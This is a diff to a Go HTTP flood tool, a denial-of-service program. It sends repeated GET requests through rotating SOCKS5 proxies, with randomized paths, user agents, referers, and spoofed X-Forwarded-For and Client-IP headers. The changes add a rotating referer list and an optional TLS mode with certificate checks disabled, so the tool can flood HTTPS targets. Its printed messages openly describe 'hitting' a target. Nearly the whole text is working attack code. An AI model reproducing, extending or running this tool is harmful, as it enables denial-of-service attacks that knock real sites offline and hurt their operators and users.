@@ -9,7 +9,7 @@ package main
 
 import (
 	"bufio"
-        //"crypto/tls"
+        "crypto/tls"
 	"fmt"
 	"io"
 	"math/rand"
@@ -24,7 +24,6 @@ import (
 var (
 	socks_list = make([]string, 0, 4)
 	start      = make(chan bool)
-	arguments = strconv.Itoa(rand.Intn(10000000000000))
 	UserAgents = []string{
 		"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -125,6 +124,15 @@ var (
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
+    referers = []string{
+    	"https://www.google.com/search?q=",
+    	"https://check-host.net/",
+    	"https://www.facebook.com/",
+    	"https://www.youtube.com/",
+    	"https://www.fbi.com/",
+    	"https://www.bing.com/search?q=",
+    	"https://r.search.yahoo.com/"}
+
 	page string
 )
 
@@ -150,26 +158,30 @@ func flood() {
 	for {
 		socks_addr := socks_list[rand.Intn(len(socks_list))]
 		socks, err := proxy.SOCKS5("tcp", socks_addr, nil, proxy.Direct)
+
 		if err != nil {
 			fmt.Fprintln(os.Stderr, "Can't connect to the proxy:", err)
 			continue
 		}
 		request := "GET /" + os.Args[6] + page + strconv.Itoa(rand.Intn(1000000000000000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(1000000000000000000)) + string(abcd[rand.Intn(len(abcd))]) + " HTTP/1.1\r\nHost: " + os.Args[1] +"\r\n"
-		request += "Referer: https://www.google.com/search?q="+ ip + "\r\n"
+		request += "Referer: " + referers[rand.Intn(len(referers))] + ip + "\r\n"
 		request += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
-		request += "Accept: " + acceptall[rand.Intn(len(acceptall))] + "\r\n"
+		request += acceptall[rand.Intn(len(acceptall))]
 		request += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-                request += "X-Forwarded-For: "+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"\r\n"
-                request += "Client-IP: "+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"\r\n\r\n"
+		request += "X-Forwarded-For: "+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"\r\n"
+		request += "Client-IP: "+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"."+strconv.Itoa(rand.Intn(255))+"\r\n\r\n"
 		for {
 			s, err = socks.Dial("tcp", addr)
 
 			if err != nil {
-				fmt.Println("Connection Down!!!  | " + socks_addr) //for those who need share with skid
+				//fmt.Println("Connection Down!!!  | " + socks_addr) //for those who need share with skid
 				break
 			} else {
 				defer s.Close()
-				fmt.Println("Hitting Target From | " + socks_addr) //for those who need share with skid
+				if os.Args[7] == "ssl" {
+    					s = tls.Client(s, &tls.Config{ServerName: ip,InsecureSkipVerify: true,})
+				}
+				//fmt.Println("Hitting Target From | " + socks_addr) //for those who need share with skid
 				for i := 0; i < 100; i++ {
 					s.Write([]byte(request))
 				}
@@ -182,8 +194,8 @@ func flood() {
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	fmt.Println("Maybe i should run away...")
-	if len(os.Args) != 7 {
-		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list> <path>")
+	if len(os.Args) != 8 {
+		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list> <path> <plain/ssl>")
 		os.Exit(1)
 	}
 	var threads, _ = strconv.Atoi(os.Args[3])
